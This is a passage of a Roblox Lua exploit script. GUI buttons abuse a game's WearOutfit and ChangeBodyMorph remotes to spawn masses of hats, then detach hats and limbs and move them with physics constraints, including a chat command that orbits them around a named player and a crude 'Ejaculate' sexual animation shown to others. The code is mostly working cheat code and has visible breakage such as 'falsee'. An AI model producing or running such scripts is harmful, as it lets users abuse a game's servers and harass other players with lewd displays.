    Hat299 = code;
    Hat300 = code;
    Hat301 = code;
    Hat302 = code;
    Hat303 = code;
    Hat304 = code;
    Hat305 = code;
    Hat306 = code;
    Hat307 = code;
    Hat308 = code;
    Hat309 = code;
    Hat310 = code;
    Hat311 = code;
    Hat312 = code;
    Hat313 = code;
    Hat314 = code;
    Hat315 = code;
    Hat316 = code;
    Hat317 = code;
    Hat318 = code;
    Hat319 = code;
    Hat320 = code;
    Hat321 = code;
    Hat322 = code;
    Hat323 = code;
    Hat324 = code;
    Hat325 = code;
    Hat326 = code;
    Hat327 = code;
    Hat328 = code;
    Hat329 = code;
    Hat330 = code;
    Hat331 = code;
    Hat332 = code;
    Hat333 = code;
    Hat334 = code;
    Hat335 = code;
    Hat336 = code;
    Hat337 = code;
    Hat338 = code;
    Hat339 = code;
    Hat340 = code;
    Hat341 = code;
    Hat342 = code;
    Hat343 = code;
    Hat344 = code;
    Hat345 = code;
    Hat346 = code;
    Hat347 = code;
    Hat348 = code;
    Hat349 = code;
    Hat350 = code;
    Hat351 = code;
    Hat352 = code;
    Hat353 = code;
    Hat354 = code;
    Hat355 = code;
    Hat356 = code;
    Hat357 = code;
    Hat358 = code;
    Hat359 = code;
    Hat360 = code;
    Hat361 = code;
    Hat362 = code;
    Hat363 = code;
    Hat364 = code;
    Hat365 = code;
    Hat366 = code;
    Hat367 = code;
    Hat368 = code;
    Hat369 = code;
    Hat370 = code;
    Hat371 = code;
    Hat372 = code;
    Hat373 = code;
    Hat374 = code;
    Hat375 = code;
    Hat376 = code;
    Hat377 = code;
    Hat378 = code;
    Hat379 = code;
    Hat380 = code;
    Hat381 = code;
    Hat382 = code;
    Hat383 = code;
    Hat384 = code;
    Hat385 = code;
    Hat386 = code;
    Hat387 = code;
    Hat388 = code;
    Hat389 = code;
    Hat390 = code;
    Hat391 = code;
    Hat392 = code;
    Hat393 = code;
    Hat394 = code;
    Hat395 = code;
    Hat396 = code;
    Hat397 = code;
    Hat398 = code;
    Hat399 = code;
    Hat400 = code;
    Hat401 = code;
    Hat402 = code;
    Hat403 = code;
    Hat404 = code;
    Hat405 = code;
    Hat406 = code;
    Hat407 = code;
    Hat408 = code;
    Hat409 = code;
    Hat410 = code;
    Hat411 = code;
    Hat412 = code;
    Hat413 = code;
    Hat414 = code;
    Hat415 = code;
    Hat416 = code;
    Hat417 = code;
    Hat418 = code;
    Hat419 = code;
    Hat420 = code;
    Hat421 = code;
    Hat422 = code;
    Hat423 = code;
    Hat424 = code;
    Hat425 = code;
    Hat426 = code;
    Hat427 = code;
    Hat428 = code;
    Hat429 = code;
    Hat430 = code;
    Hat431 = code;
    Hat432 = code;
    Hat433 = code;
    Hat434 = code;
    Hat435 = code;
    Hat436 = code;
    Hat437 = code;
    Hat438 = code;
    Hat439 = code;
    Hat440 = code;
    Hat441 = code;
    Hat442 = code;
    Hat443 = code;
    Hat444 = code;
    Hat445 = code;
    Hat446 = code;
    Hat447 = code;
    Hat448 = code;
    Hat449 = code;
    Hat450 = code;
    Hat451 = code;
    Hat452 = code;
    Hat453 = code;
    Hat454 = code;
    Hat455 = code;
    Hat456 = code;
    Hat457 = code;
    Hat458 = code;
    Hat459 = code;
    Hat460 = code;
    Hat461 = code;
    Hat462 = code;
    Hat463 = code;
    Hat464 = code;
    Hat465 = code;
    Hat466 = code;
    Hat467 = code;
    Hat468 = code;
    Hat469 = code;
    Hat470 = code;
    Hat471 = code;
    Hat472 = code;
    Hat473 = code;
    Hat474 = code;
    Hat475 = code;
    Hat476 = code;
    Hat477 = code;
    Hat478 = code;
    Hat479 = code;
    Hat480 = code;
    Hat481 = code;
    Hat482 = code;
    Hat483 = code;
    Hat484 = code;
    Hat485 = code;
    Hat486 = code;
    Hat487 = code;
    Hat488 = code;
    Hat489 = code;
    Hat490 = code;
    Hat491 = code;
    Hat492 = code;
    Hat493 = code;
    Hat494 = code;
    Hat495 = code;
    Hat496 = code;
    Hat497 = code;
    Hat498 = code;
    Hat499 = code;
    Hat500 = code;
    
    RemoveShirt = false;
    
    Pants = "";
    RPDesc = "";
    RPName = "";
    Shirt = "";
}


habies:InvokeServer(args)

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

function ftp(str)
    local pt = {};
    if str ~= 'me' and str ~= 'random' then
        for i, v in pairs(game.Players:GetPlayers()) do
            if v.Name:lower():find(str:lower()) then
                table.insert(pt, v);
            end
        end
    elseif str == 'me' then
        table.insert(pt, plr);
	elseif str == 'random' then
		table.insert(pt, game.Players:GetPlayers()[math.random(1, #game.Players:GetPlayers())]);
    end
    return pt;
end

for _, v in pairs(hum:GetAccessories()) do
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0);
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	still.MaxTorque = Vector3.new(math.huge, math.huge, math.huge);
	still.AngularVelocity = Vector3.new(0, 0, 0);
	local align = Instance.new('AlignPosition', b);
	align.MaxForce = 1000000;
	align.MaxVelocity = math.huge;
	align.RigidityEnabled = falsee
	align.Responsiveness = 20;
	align.ApplyAtCenterOfMass = true;
	align.Responsiveness = 200;
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
end

local par = {};
for _, v in pairs(mov) do
	local parr = Instance.new('Part', workspace);
	parr.Anchored = true;
	parr.Size = Vector3.new(1, 1, 1);
	parr.Transparency = 1;
	parr.CanCollide = false;
	table.insert(par, parr);
end

local rotx = 0;
local rotz = math.pi / 2;
local height = 0;
local heighti = 1;
local offset = 10;
local speed = 0.5;
local mode = 4;
local angular = Vector3.new(0, 0, 0);
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
	rotx = rotx + speed / 100;
	rotz = rotz + speed / 100;
	l = (l >= 360 and 1 or l + speed);
	
	for i, v in pairs(par) do
		v.CFrame = CFrame.new(chr.HumanoidRootPart.Position) * CFrame.fromEulerAnglesXYZ(0, math.rad(l + (360 / #par) * i + speed), 0) * CFrame.new(offset, 0, 0);
	end
	
	if heighti == 1 then
		height = height + speed / 100;
	elseif heighti == 2 then
		height = height - speed / 100;
	end
	if height > 2 then
		heighti = 2;
	end
	if height < -1 then
		heighti = 1;
	end
	
	if mode == 1 then
		for _, v in pairs(mov) do
			v.Position = Vector3.new(math.sin(rotx) * offset, 0, math.sin(rotz) * offset);
		end
	elseif mode == 2 then
		for _, v in pairs(mov) do
			v.Position = Vector3.new(offset, height, offset);
		end
	elseif mode == 3 then
		for _, v in pairs(mov) do
			v.Position = Vector3.new(math.sin(rotx) * offset, height, math.sin(rotz) * offset);
		end
	elseif mode == 4 then
		for i, v in pairs(mov) do
			v.Position = Vector3.new(math.random(-100,100),math.random(-2,5),math.random(-100,100))
		end
	elseif mode == 5 then
		for i, v in pairs(mov) do
			v.Position = Vector3.new((math.sin(rotx)) * offset, height, (math.cos(rotz) - i) * offset);
		end
	elseif mode == 6 then
		for i, v in pairs(mov) do
			v.Position = Vector3.new((math.sin(rotx)) * offset, height, (math.tan(rotz) - i) * offset);
		end
	elseif mode == 7 then
		for i, v in pairs(mov) do
			v.Position = Vector3.new(math.cos(rotx * i) * offset, 0, math.cos(rotz * i) * offset);
		end
	elseif mode == 8 then
	    for i, v in pairs(mov) do
			v.Position = Vector3.new(math.sin(rotx) * i * offset, 0, math.sin(rotz) * i * offset);
		end
	elseif mode == 9 then
		pcall(function()
			local so = nil;
			for k, b in pairs(chr:GetChildren()) do
				if b:IsA'Tool' then
					for h, j in pairs(b:GetDescendants()) do
						if j:IsA'Sound' then
							so = j;
						end
					end
				end
			end
			if so ~= nil then
				offset = so.PlaybackLoudness / 35;
				speed = so.PlaybackLoudness / 500;
				angular = Vector3.new(0, so.PlaybackLoudness / 75, 0);
			end
		end)
		for i, v in pairs(mov) do
			v.Position = Vector3.new(chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).X, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Y, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Z);
		end
	elseif mode == 10 then
		offset = height * 15;
		for i, v in pairs(mov) do
			v.Position = Vector3.new(chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).X, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Y, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Z);
		end
	elseif mode == 11 then
		for i, v in pairs(mov) do
			v.Position = Vector3.new(chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(plr:GetMouse().Hit.p)).X, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(plr:GetMouse().Hit.p)).Y, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(plr:GetMouse().Hit.p)).Z) + Vector3.new(chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).X, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Y, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Z);
		end
	end
	for _, v in pairs(mov2) do
		v.AngularVelocity = angular;
	end
end)
game.Players.LocalPlayer.Chatted:Connect(function(c)
	if c:split(' ')[1] == '.orbit' then
		for _, v in pairs(mov) do
			chr = ftp(c:split(' ')[2])[1].Character;
			v.Parent = ftp(c:split(' ')[2])[1].Character.HumanoidRootPart;
		end
	end
	if c:split(' ')[1] == '.speed' then
		speed = tonumber(c:split(' ')[2]);
	end
	if c:split(' ')[1] == '.mode' then
		mode = tonumber(c:split(' ')[2]);
	end
	if c:split(' ')[1] == '.offset' then
		offset = tonumber(c:split(' ')[2]);
	end
	if c:split(' ')[1] == '.angular' then
		angular = Vector3.new(tonumber(c:split(' ')[2]), tonumber(c:split(' ')[3]), tonumber(c:split(' ')[4]));
	end
end) 
end)

Script_11.Name = "Script"
Script_11.Parent = HatScripts
Script_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_11.Position = UDim2.new(2.63461542, 0, 11, 0)
Script_11.Size = UDim2.new(0, 52, 0, 19)
Script_11.Visible = false
Script_11.Font = Enum.Font.SourceSans
Script_11.Text = "Tiny Tonk"
Script_11.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_11.TextSize = 14.000
Script_11.MouseButton1Click:connect(function()
    local habies = game.ReplicatedStorage.RemoteFunctions.WearOutfit

local code = "4735123833"
local args = {
    Face = "";
    
    Hat1 = "4735123833";
    Hat2 = "5647510290";
    
    RemoveShirt = false;
    
    Pants = "";
    RPDesc = "";
    RPName = "";
    Shirt = "";
}


habies:InvokeServer(args)
-- Hat Position
local function tonk()
local HAT = "New Tonk"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -1.9
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

hum.HipHeight = -.8

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(chr.HumanoidRootPart.Orientation.X + XvalO.Value, chr.HumanoidRootPart.Orientation.Y + YvalO.Value, chr.HumanoidRootPart.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end


-- Main Animation
-- Hat Position
local function RightArm()
local Limb = "Right Arm"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = 0
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, b in pairs(chr:GetChildren()) do
    if b.Name == Limb then
	b.CanCollide = false;
	b:BreakJoints();
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Torso);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


spintog = true

local function spin()
   if spintog == true then
       spintog = false
       XvalO.Value = XvalO.Value +5
       wait()
       spintog = true
    end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)

local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, b in pairs(chr:GetChildren()) do
if b.Name == Limb then
    b.Orientation = Vector3.new(plr.Character.Torso.Orientation.X + XvalO.Value, plr.Character.Torso.Orientation.Y + YvalO.Value, plr.Character.Torso.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

-- Main Animation
-- Hat Position
local function LeftArm()
local Limb = "Left Arm"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = 0
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, b in pairs(chr:GetChildren()) do
    if b.Name == Limb then
	b.CanCollide = false;
	b:BreakJoints();
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Torso);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

spintog = true

local function spine()
   if spintog == true then
       spintog = false
       XvalO.Value = XvalO.Value -5
       spintog = true
    end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)

local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, b in pairs(chr:GetChildren()) do
if b.Name == Limb then
    b.Orientation = Vector3.new(plr.Character.Torso.Orientation.X + XvalO.Value, plr.Character.Torso.Orientation.Y + YvalO.Value, plr.Character.Torso.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function RightLeg()
local Limb = "Right Leg"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = 0
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, b in pairs(chr:GetChildren()) do
    if b.Name == Limb then
	b.CanCollide = false;
	b:BreakJoints();
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Torso);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


spintog = true

local function spin()
   if spintog == true then
       spintog = false
       XvalO.Value = XvalO.Value +5
       wait()
       spintog = true
    end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)

local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, b in pairs(chr:GetChildren()) do
if b.Name == Limb then
    b.Orientation = Vector3.new(plr.Character.Torso.Orientation.X + XvalO.Value, plr.Character.Torso.Orientation.Y + YvalO.Value, plr.Character.Torso.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

-- Main Animation
-- Hat Position
local function LeftLeg()
local Limb = "Left Leg"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = 0
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, b in pairs(chr:GetChildren()) do
    if b.Name == Limb then
	b.CanCollide = false;
	b:BreakJoints();
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Torso);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

spintog = true

local function spine()
   if spintog == true then
       spintog = false
       XvalO.Value = XvalO.Value -5
       spintog = true
    end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)

local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, b in pairs(chr:GetChildren()) do
if b.Name == Limb then
    b.Orientation = Vector3.new(plr.Character.Torso.Orientation.X + XvalO.Value, plr.Character.Torso.Orientation.Y + YvalO.Value, plr.Character.Torso.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

game.Players.LocalPlayer.Character.Humanoid.Animator:Destroy()
RightArm()
LeftArm()
RightLeg()
LeftLeg()
tonk()
end)

Script_12.Name = "Script"
Script_12.Parent = HatScripts
Script_12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_12.Position = UDim2.new(1.32692313, 0, 11, 0)
Script_12.Size = UDim2.new(0, 52, 0, 19)
Script_12.Visible = false
Script_12.Font = Enum.Font.SourceSans
Script_12.Text = "Ejaculate"
Script_12.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_12.TextSize = 14.000
Script_12.MouseButton1Click:connect(function()

-- Main Animation
-- Hat Position
game:GetService("RunService").RenderStepped:Connect(function()
    
    
end)

local function cum()
    cumValue.Value = 0
    local habies = game.ReplicatedStorage.RemoteFunctions.WearOutfit

local code = "89171071"
local args = {
    Face = "";
    
    Hat1 = code;
    Hat2 = code;
    Hat3 = code;
    Hat4 = code;
    Hat5 = code;
    Hat6 = code;
    Hat7 = code;
    Hat8 = code;
    Hat9 = code;
    Hat10 = code;
    Hat11 = code;
    Hat12 = code;
    Hat13 = code;
    Hat14 = code;
    Hat15 = code;
    Hat16 = code;
    Hat17 = code;
    Hat18 = code;
    Hat19 = code;
    Hat20 = code;
    Hat21 = code;
    Hat22 = code;
    Hat23 = code;
    Hat24 = code;
    Hat25 = code;
    Hat26 = code;
    Hat27 = code;
    Hat28 = code;
    Hat29 = code;
    Hat30 = code;
    Hat31 = code;
    Hat32 = code;
    Hat33 = code;
    Hat34 = code;
    Hat35 = code;
    Hat36 = code;
    Hat37 = code;
    Hat38 = code;
    Hat39 = code;
    Hat40 = code;
    Hat41 = code;
    Hat42 = code;
    Hat43 = code;
    Hat44 = code;
    Hat45 = code;
    Hat46 = code;
    Hat47 = code;
    Hat48 = code;
    Hat49 = code;
    Hat50 = code;
    
    RemoveShirt = false;
    
    Pants = "";
    RPDesc = "";
    RPName = "";
    Shirt = "";
}


habies:InvokeServer(args)
for i,hat in pairs(game.Players.LocalPlayer.Character.Humanoid:GetAccessories()) do
   if hat:IsA("Accessory") then
       if hat.Name == "SecurityFedora" then
           hat.Parent = game.Workspace
        end
    end
end
end

local Limb = "Right Arm"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 1.5
Yval.Value = 0
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, b in pairs(chr:GetChildren()) do
    if b.Name == Limb then
	b.CanCollide = false;
	b:BreakJoints();
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Torso);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)

local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, b in pairs(chr:GetChildren()) do
if b.Name == Limb then
    b.Orientation = Vector3.new(plr.Character.Torso.Orientation.X + XvalO.Value, plr.Character.Torso.Orientation.Y + YvalO.Value, plr.Character.Torso.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()

-- Main Animation
-- Hat Position
local Limb1 = "Left Arm"
local Xval1 = Instance.new("NumberValue")
local Yval1 = Instance.new("NumberValue")
local Zval1 = Instance.new("NumberValue")

local XvalO1 = Instance.new("NumberValue")
local YvalO1 = Instance.new("NumberValue")
local ZvalO1 = Instance.new("NumberValue")

toggle = true

local angular1 = Vector3.new(0,0,0)

Xval1.Value = -1.5
Yval1.Value = 0
Zval1.Value = 0

XvalO1.Value = 0
YvalO1.Value = 0
ZvalO1.Value = 0

local mov3 = {};
local mov4 = {};

for _, b in pairs(chr:GetChildren()) do
    if b.Name == Limb1 then
	b.CanCollide = false;
	b:BreakJoints();
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a01 = Instance.new('Attachment', b);
	local a11 = Instance.new('Attachment', chr.Torso);
	align.Attachment0 = a01;
	align.Attachment1 = a11;
	table.insert(mov3, a11);
	table.insert(mov4, still);
	end
end



local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov3) do
		   v.Position = Vector3.new(Xval1.Value, Yval1.Value, Zval1.Value);
		end
	end
	end
end)

local function orie1()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, b in pairs(chr:GetChildren()) do
if b.Name == Limb1 then
    b.Orientation = Vector3.new(plr.Character.Torso.Orientation.X + XvalO1.Value, plr.Character.Torso.Orientation.Y + YvalO1.Value, plr.Character.Torso.Orientation.Z + ZvalO1.Value)
end
end

end)
end

for _, v in pairs(mov4) do
	v.AngularVelocity = angular;
end

    Yval.Value = -0.3
    Xval.Value = .5
    Zval.Value = -.4
    ZvalO.Value = -45
    YvalO.Value = -45
    
orie1()
cumValue = Instance.new("NumberValue")
up = true
down = false
mouse = plr:GetMouse()
mouse.Button1Down:connect(function()
    if up == true then
    cumValue.Value = cumValue.Value +1
    up = false
    YvalO.Value = -45
   wait()
   YvalO.Value = -35
   wait()
   YvalO.Value = -25
   wait()
   YvalO.Value = -15
   wait()
   YvalO.Value = -5
   wait()
   YvalO.Value = 0
   down = true
    end
end)
mouse.Button1Down:connect(function()
if down == true then
    cumValue.Value = cumValue.Value +1
    down = false
   YvalO.Value = -5
   wait()
   YvalO.Value = -15
   wait()
   YvalO.Value = -25
   wait()
   YvalO.Value = -35
   wait()
   up = true
end
end)

while wait() do
   if cumValue.Value >= 100 then
       cum()
    end
end 
end)

Script_13.Name = "Script"
Script_13.Parent = HatScripts
Script_13.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_13.Position = UDim2.new(-1.25, 0, 9, 0)
Script_13.Size = UDim2.new(0, 52, 0, 19)
Script_13.Visible = false
Script_13.Font = Enum.Font.SourceSans
Script_13.Text = "Fat Man"
Script_13.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_13.TextSize = 14.000
Script_13.MouseButton1Click:connect(function()
    local habies = game.ReplicatedStorage.RemoteFunctions.WearOutfit
local habiee = game.ReplicatedStorage.RemoteFunctions.ChangeBodyMorph
habiee:FireServer("Robloxian 2.0")
local code = "6380274618"
local args = {
    Face = "";
    
    Hat1 = code;
    Hat2 = code;
    Hat3 = code;
    Hat4 = code;
    Hat5 = code;
    Hat6 = code;

    RemoveShirt = false;
    
    Pants = "";
    RPDesc = "";
    RPName = "";
    Shirt = "";
}


habies:InvokeServer(args)

local function raBlock()
-- Main Animation
-- Hat Position
local p = game.Players.LocalPlayer.Character["Big Block"]
p.Name = "1"
local HAT = "1"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = 0
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
